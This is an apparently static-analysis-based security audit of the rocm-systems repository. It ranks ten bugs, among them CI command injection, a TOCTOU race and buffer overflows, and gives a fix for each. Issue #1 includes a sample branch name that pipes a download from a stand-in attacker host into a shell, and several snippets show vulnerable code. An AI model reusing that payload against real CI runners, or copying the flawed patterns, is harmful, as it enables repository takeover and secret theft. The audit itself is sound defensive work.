# Top 10 Most Critical Issues

**Repository**: rocm-systems
**Date**: 2026-04-11
**Source**: Static analysis across 13 tools, ~199,000 raw findings
**Selection criteria**: Exploitability, blast radius, confidence, privilege level

---

## How We Ranked These

Each issue was scored on four dimensions:

| Criterion | Weight | Description |
|-----------|--------|-------------|
| **Exploitability** | 30% | Can an attacker trigger this? Is input external? |
| **Blast radius** | 30% | Silent data corruption in GPU runtime > crash > test failure |
| **Confidence** | 20% | Multiple tools agree? Code reviewed? Pattern confirmed? |
| **Privilege level** | 20% | Root daemon > library code > test code > example code |

---

## Issue #1: CI Script Command Injection via PR Branch Names — [Full Analysis](analysis-reports/critical/01-ci-command-injection.md)

**Severity**: CRITICAL
**File**: `.github/scripts/import_subrepo_prs.py:68`
**Tools**: bandit B602, B605 | Code review confirmed
**Exploitability**: HIGH — attacker creates PR with malicious branch name

### The Bug

```python
def run(cmd, **kwargs):
    subprocess.check_call(cmd, shell=True, **kwargs)  # line 9

# Later:
head_ref = pr.head.ref          # attacker-controlled branch name
run(f"git subtree pull --prefix={prefix} {head_url} {head_ref}")  # line 68
```

An external contributor creates a PR with branch name:
```
feat/x$(curl attacker.com/pwn|sh)
```

The `shell=True` subprocess expands this, executing arbitrary commands on the GitHub Actions runner with access to `GITHUB_TOKEN` and repository write permissions.

### Impact
- Full repository compromise (push to any branch, delete branches)
- Exfiltration of `GITHUB_TOKEN` and any other CI secrets
- Supply chain attack vector (inject malicious code into releases)

### Fix
```python
def run(cmd_list, **kwargs):
    subprocess.check_call(cmd_list, **kwargs)  # shell=False, list args

run(["git", "subtree", "pull", f"--prefix={prefix}", head_url, head_ref])
```

Also affects: `pr_category_label.py:91,96,97`, `pr_detect_changed_subtrees.py:115,120`

---

## Issue #2: HMAC Key File Permission Race (TOCTOU) in cuid Daemon — [Full Analysis](analysis-reports/critical/02-cuid-chmod-toctou.md)

**Severity**: CRITICAL
**File**: `projects/cuid/lib/src/hmac.cc:163`
**Tools**: flawfinder (level 5) | Code review confirmed
**Exploitability**: MEDIUM — requires local access, daemon runs as root

### The Bug

```cpp
key_file.write(reinterpret_cast<const char*>(key), key_length);
key_file.close();
// WINDOW: between close() and chmod(), attacker swaps path with symlink
if (chmod(key_file_path.c_str(), S_IRUSR | S_IWUSR) != 0) {
    return AMDCUID_STATUS_PERMISSION_DENIED;
}
```

Between `close()` and `chmod()`, an attacker can replace `key_file_path` with a symlink to any file. The `chmod` then changes permissions on the attacker's target file. Since cuid runs as a privileged daemon handling HMAC keys, this is a privilege escalation vector.

### Impact
- Attacker can change permissions on arbitrary files (e.g., `/etc/shadow`)
- Key material could be written to attacker-controlled location via symlink

### Fix
```cpp
int fd = open(key_file_path.c_str(), O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, S_IRUSR | S_IWUSR);
// write key via fd, not via path
// no separate chmod needed — permissions set at creation
```

Also affects: `cuid/lib/src/cuid_file.cc:606,609`, `amdsmi/rocm_smi/src/rocm_smi_logger.cc:502`, `amdsmi/rocm_smi/src/rocm_smi_utils.cc:690`

---

## Issue #3: Buffer Overflow via sscanf Without Width Limits in amdsmi — [Full Analysis](analysis-reports/critical/03-sscanf-buffer-overflow.md)

**Severity**: HIGH
**Files**: `projects/amdsmi/rocm_smi/src/rocm_smi.cc:7146,7325` + 20 more locations
**Tools**: flawfinder (level 4), cpplint | Code review confirmed
**Exploitability**: MEDIUM — input comes from sysfs/proc which could be influenced

### The Bug

```cpp
char task_name[256];
sscanf(message, "%x:%s\n", &pid, task_name);  // line 7146
```

`%s` in sscanf has no width limit. If `message` contains a string longer than 255 characters after the hex value, this overflows `task_name` on the stack.

### Impact
- Stack buffer overflow — potential code execution
- amdsmi runs as a system management library, often with elevated privileges
- The `message` data comes from reading `/proc/*/maps` and sysfs files

### Fix
```cpp
sscanf(message, "%x:%255s\n", &pid, task_name);
// Or better: use C++ std::istringstream
```

Full list of affected locations (22 total):
- `rocm_smi.cc:7146,7325`
- `amd_smi.cc:5478`
- `amd_smi_utils.cc:356,386,582,585`
- `fdinfo.cc:161,171,176,181,186,190`
- `rocm_smi_binary_parser.cc:82,84,198` (sprintf)

---

## Issue #4: memcpy Copying Pointer Size Instead of Data (100 locations) — [Full Analysis](analysis-reports/critical/04-memcpy-sizeof-pointer.md)

**Severity**: HIGH
**Files**: 100 locations across multiple projects
**Tools**: semgrep-cpp (memcpy-sizeof-pointer rule)
**Exploitability**: N/A — correctness bug, not security

### The Bug

```cpp
memcpy(dst, src, sizeof(ptr));  // copies 8 bytes (pointer size on x64)
// Should be:
memcpy(dst, src, sizeof(*ptr)); // copies actual data size
```

This pattern copies exactly 8 bytes regardless of what `ptr` points to. If the pointed-to type is larger than 8 bytes, data is silently truncated. If smaller, it reads past the intended boundary.

### Impact
- Silent data corruption in GPU runtime operations
- In AI/ML workloads, truncated data produces silently wrong model outputs
- 100 instances means this is a systemic pattern, not a one-off typo

### Fix
Review each instance. Change `sizeof(ptr)` to `sizeof(*ptr)` or `n * sizeof(element_type)`.

---

## Issue #5: Dangling .c_str() — Use-After-Free (59 locations) — [Full Analysis](analysis-reports/critical/05-dangling-cstr.md)

**Severity**: HIGH
**Files**: 59 locations across multiple projects
**Tools**: semgrep-cpp (dangling-c-str rule)
**Exploitability**: N/A — correctness bug, intermittent crashes

### The Bug

```cpp
const char* name = some_function().c_str();  // temporary string destroyed
use(name);  // dangling pointer — undefined behavior
```

When `.c_str()` is called on a temporary `std::string`, the string is destroyed at the end of the full expression. The pointer becomes dangling. Depending on memory reuse patterns, this may:
- Work by coincidence (memory not yet reused)
- Return garbage data
- Crash with SIGSEGV
- Be exploitable for information disclosure

### Impact
- Intermittent crashes that are hard to reproduce
- Silent data corruption if the memory is reused
- Potential security issue if the string contained sensitive data

### Fix
```cpp
std::string name = some_function();  // keep the string alive
use(name.c_str());
```

---

## Issue #6: Unchecked HIP API Returns in Core Runtime (clr, rccl, rocshmem) — [Full Analysis](analysis-reports/critical/06-unchecked-hip-returns.md)

**Severity**: HIGH
**Files**: ~300 non-test locations in clr (150), rccl (128), rocshmem (74)
**Tools**: hip-check + semgrep-cpp (hip-unchecked-malloc, hip-unchecked-memcpy, hip-unchecked-launch)
**Exploitability**: N/A — correctness/reliability

### The Bug

```cpp
hipMalloc(&dev_ptr, size);      // returns hipErrorOutOfMemory — IGNORED
hipMemcpy(dst, src, size, ...); // returns hipErrorInvalidValue — IGNORED
kernel<<<grid, block>>>(...);   // launch may fail — IGNORED
```

HIP API calls return `hipError_t` status codes. When memory allocation fails, `dev_ptr` remains null. When memcpy fails, destination contains stale/zero data. When a kernel fails to launch, no computation happens.

### Impact
- **Silent wrong results in AI/ML training**: A failed `hipMalloc` followed by an unchecked `hipMemcpy` and kernel launch produces garbage gradients. The training loop continues with wrong values. Model appears to "train" but produces nonsense.
- **rccl (collective communications)**: Failed allocations in all-reduce operations cause gradient divergence across nodes — distributed training silently produces a broken model.

### Fix
```cpp
#define HIP_CHECK(call) do { \
    hipError_t err = (call); \
    if (err != hipSuccess) { \
        fprintf(stderr, "HIP error %s at %s:%d\n", \
                hipGetErrorString(err), __FILE__, __LINE__); \
        abort(); \
    } \
} while(0)

HIP_CHECK(hipMalloc(&dev_ptr, size));
```

---

## Issue #7: HIP Double-Free on GPU Memory (11 locations) — [Full Analysis](analysis-reports/critical/07-hip-double-free.md)

**Severity**: HIGH
**Files**: 11 locations, primarily in hip-tests but pattern may exist in runtime
**Tools**: hip-check (hip-double-free rule)
**Exploitability**: N/A — crash/corruption

### The Bug

```cpp
hipFree(dev_ptr);
// ... some code paths ...
hipFree(dev_ptr);  // double-free
```

Calling `hipFree` twice on the same pointer corrupts the GPU memory allocator. The same GPU memory may be returned by a subsequent `hipMalloc`, leading to two different buffers aliasing the same physical memory.

### Impact
- GPU memory corruption
- Two kernels writing to the same physical memory simultaneously
- Silent data corruption in AI/ML workloads
- Hard to diagnose — may only manifest under specific allocation patterns

### Fix
Set pointer to null after free: `hipFree(dev_ptr); dev_ptr = nullptr;`
Or use RAII wrappers that prevent double-free by design.

---

## Issue #8: SSL Certificate Verification Disabled in LLM Client — [Full Analysis](analysis-reports/critical/08-ssl-verify-disabled.md)

**Severity**: HIGH
**File**: `experimental/python/rocinsight/rocinsight/ai_analysis/interactive.py:4324`
**Tools**: bandit B501 | Code review confirmed
**Exploitability**: HIGH — network-level MITM

### The Bug

```python
client = httpx.Client(verify=False)  # SSL verification disabled
response = client.post(llm_endpoint, json={"prompt": source_code_context})
```

This sends GPU profiling data and source code snippets to an LLM API over an unverified HTTPS connection.

### Impact
- MITM attacker can intercept source code and profiling data
- Attacker can inject modified LLM responses (AI supply chain attack)
- The `ROCINSIGHT_LLM_PRIVATE_VERIFY_SSL=0` flag provides no runtime warning

### Fix
```python
# Default to verification enabled
verify = os.getenv("ROCINSIGHT_LLM_VERIFY_SSL", "1") != "0"
if not verify:
    warnings.warn("SSL verification disabled — LLM traffic is unprotected", stacklevel=2)
client = httpx.Client(verify=verify)
```

---

## Issue #9: Thread-Unsafe Functions in Multi-Threaded GPU Runtime — [Full Analysis](analysis-reports/critical/09-thread-unsafe-functions.md)

**Severity**: MEDIUM-HIGH
**Files**: 121 `strtok` + 86 `strerror` = 207 locations
**Tools**: cpplint (runtime/threadsafe_fn), semgrep-cpp (strerror-thread-unsafe)
**Exploitability**: N/A — data race / correctness

### The Bug

```cpp
// strtok uses global state — data race if called from multiple threads
char* token = strtok(line, ",");   // NOT thread-safe

// strerror returns pointer to shared static buffer
fprintf(stderr, "Error: %s\n", strerror(errno));  // NOT thread-safe
```

In a GPU runtime where multiple host threads manage different GPU devices and streams, these functions cause data races. `strtok` corrupts parse state across threads. `strerror` may return a string that another thread overwrites before it's used.

### Impact
- Corrupted parsed data (strtok)
- Wrong or garbled error messages (strerror)
- In GPU runtime context, may cause wrong device selection or configuration

### Fix
```cpp
char* token = strtok_r(line, ",", &saveptr);  // thread-safe
char buf[256]; strerror_r(errno, buf, sizeof(buf));  // thread-safe
```

---

## Issue #10: strncat Buffer Overflow in hip-tests — [Full Analysis](analysis-reports/critical/10-strncat-overflow.md)

**Severity**: MEDIUM-HIGH
**Files**: `projects/hip-tests/catch/unit/device/hipDeviceGetUuid.cc:150,240`, `getUUIDfrmRocinfo_Exe.cc:30`
**Tools**: flawfinder (level 5) | Code review confirmed
**Exploitability**: LOW — test code, but pattern may be copied

### The Bug

```cpp
char command[COMMAND_LEN];
// ... command partially filled ...
strncat(command, " | grep -i Uuid:", COMMAND_LEN);  // WRONG
```

`strncat`'s third argument should be the **remaining space** in the buffer, not the total buffer size. If `command` already contains data, this writes past the end of the buffer.

The correct form:
```cpp
strncat(command, " | grep -i Uuid:", COMMAND_LEN - strlen(command) - 1);
// Or better: snprintf
```

### Impact
- Stack buffer overflow in test executable
- Test code patterns get copied into production code
- CWE-120: Buffer Copy without Checking Size of Input

### Fix
Replace `strncat` with `snprintf`:
```cpp
snprintf(command + strlen(command), COMMAND_LEN - strlen(command),
         " | grep -i Uuid:");
```

---

## Summary Table

| # | Issue | Severity | Type | Location | Effort |
|---|-------|----------|------|----------|--------|
| 1 | CI command injection | CRITICAL | Security | .github/scripts/ | 1 hour |
| 2 | HMAC key chmod TOCTOU | CRITICAL | Security | cuid daemon | 2 hours |
| 3 | sscanf buffer overflow | HIGH | Security | amdsmi (22 locations) | 4 hours |
| 4 | memcpy sizeof(ptr) | HIGH | Correctness | 100 locations | 8 hours |
| 5 | Dangling .c_str() | HIGH | Correctness | 59 locations | 4 hours |
| 6 | Unchecked HIP returns | HIGH | Correctness | 300 runtime locations | 16 hours |
| 7 | HIP double-free | HIGH | Correctness | 11 locations | 2 hours |
| 8 | SSL verify=False | HIGH | Security | rocinsight LLM client | 1 hour |
| 9 | Thread-unsafe functions | MEDIUM-HIGH | Correctness | 207 locations | 8 hours |
| 10 | strncat overflow | MEDIUM-HIGH | Security | hip-tests (3 locations) | 1 hour |

**Estimated total effort**: ~47 hours for all 10 issues.
**Issues 1, 2, 8**: Can be fixed in a single afternoon — highest ROI.
**Issue 6**: Largest effort but highest blast radius for AI/ML correctness.
